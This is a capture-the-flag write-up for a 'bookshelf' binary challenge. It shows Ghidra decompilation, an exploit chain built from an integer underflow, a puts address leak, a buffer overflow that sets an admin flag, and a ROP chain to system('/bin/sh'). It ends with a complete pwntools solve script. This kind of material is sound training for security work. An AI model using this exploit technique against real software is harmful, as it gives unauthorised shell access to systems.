The main function calls other functions depending on the input we give it.

There are three interesting functions:
1. BuyBook
```ghidra
void buyBook(void)

{
  char cVar1;
  int iVar2;
  
  puts("Want to buy an adventure on paperback?");
  puts("Here\'s what we have in stock");
  puts("======================================");
  printf("|Cash balance: $%u|\n",(ulong)cash);
  puts("1) The Catcher in the ROP - $300");
  puts("2) The Great Hacksby - $425");
  puts("3) The Address of puts() - $99999999");
  puts("======================================");
  printf("What do you want to read? >> ");
  iVar2 = getchar();
  cVar1 = (char)iVar2;
  if (cVar1 != '\n') {
    getchar();
  }
  if (cVar1 == '3') {
    if (cash < 99999999) {
      puts("You don\'t have enough cash!");
    }
    else {
      printf("In the realm of bits and bytes, the audacious CTF player searched and searched, seekin g something useful for their intellectual shenanigans. At long last, they had finally found it . For in the distance, in all it\'s glory %p rested in slumber, it\'s image telling a story. T he End.\n"
             ,puts);
    }
  }
  else {
    if ('3' < cVar1) {
LAB_00401543:
      puts("\nInvalid option!\n");
      buyBook();
      return;
    }
    if (cVar1 == '1') {
      if (cash < 300) {
        puts("You don\'t have enough cash!");
      }
      else {
        cash = cash - 300;
        puts(
            "A restless hacker named Holden Codefield discovered ROP and became obsessed with its po wer. He saw himself as a catcher in the ROP, navigating through memory addresses to seiz e control. His place in the world soon to reveal. The End."
            );
      }
    }
    else {
      if (cVar1 != '2') goto LAB_00401543;
      if (cash < 0x1a9) {
        puts("You don\'t have enough cash!");
      }
      else {
        cash = cash - 0x1a9;
        puts(
            "In the midst of the Roaring Twenties, extravagant parties corrupted Jay Gatsby\'s memor y. Even with corrupted memory, Gatsby sought to change his past, but realized he\'d neve r be able to find an exploit that rewrites the shattered dreams of lost love. The End."
            );
      }
    }
  }
  printf("\nThanks for you\'re buisness, would you like to leave a tip? (y/N) >> ");
  iVar2 = getchar();
  cVar1 = (char)iVar2;
  if (cVar1 != '\n') {
    getchar();
  }
  if ((cVar1 == 'Y') || (cVar1 == 'y')) {
    puts("\nYay! Thank you!");
    cash = cash - 10;
  }
  else {
    puts("\nOh... ok");
  }
  return;
}
```

2. WriteBook

![image](https://github.com/AndreQuimper/Writeups/assets/96965806/38a45181-eb72-4c87-b781-a65d5f3bd504)

4. AdminBook

![image](https://github.com/AndreQuimper/Writeups/assets/96965806/1d183167-a881-48ef-a141-104855d7d7ef)


---

Since there is a buffer overflow in adminBook, Our final objective is to utilize the AdminBook function to perform a ROPchain to execute `system('/bin/sh')`.  

However, to use that function we must be "admin". We can achieve this by using the write book function, choosing audiobook and overwriting the admin flag by overflowing the buffer.  

Now we need to find the base of libc. We can do that by underflowing the `cash` integer on buyBook by repeatedly leaving tips and then buying the address of puts().  


Now that we know the exploit chain we have to follow here is the solve script:
```python
#!/usr/bin/env python2

import os
import re
import sys

from pwn import *

elf = ELF("./bookshelf_patched")
libc = ELF("./libc.so.6")
context.binary = elf
context.arch = 'amd64'
context.bits = 64

r = ["chal.pctf.competitivecyber.club",4444]
#p = remote(r[0],r[1])

p = process('./bookshelf_patched')
#gdb.attach(p)

#step 1: Find puts
p.sendline(b'2')
p.sendline(b'2')
p.sendline(b'y')

for i in range(10):
    p.sendline(b'2')
    p.sendline(b'3')
    p.sendline(b'y')

p.sendline(b'2')
p.sendline(b'3')
p.recvuntil('glory')
puts_addr = p.recvuntil(b'rested', drop=True)
puts_addr = int(puts_addr.strip(),16)
log.success("puts @ "+str(hex(puts_addr)))
p.sendline(b'n')
log.success('Step 1 Completed')

#step 2
# become admin by stack overflow if audiobook chosen
p.sendline(b'1')
p.sendline(b'y')
p.sendline(b'A'*40)
p.sendline(b'3')

log.success('Step 2 Completed')

#Step 3 -> Do ropchain with libc
offset = 56
ret = 0x40101a
libc.address = puts_addr - libc.symbols['puts']
poprdi_ret = libc.address +0x000000000002a3e5
binsh = next(libc.search(b'/bin/sh'))
# at this point since we've specified the base of libc pwntools finds the correct one
system = libc.symbols['system']

rop = ROP(elf)
rop.raw(offset*"A")
rop.raw(ret)
rop.raw(poprdi_ret)
rop.raw(binsh)
rop.raw(system)
payload = rop.chain()

p.sendline(payload)



p.interactive()
```
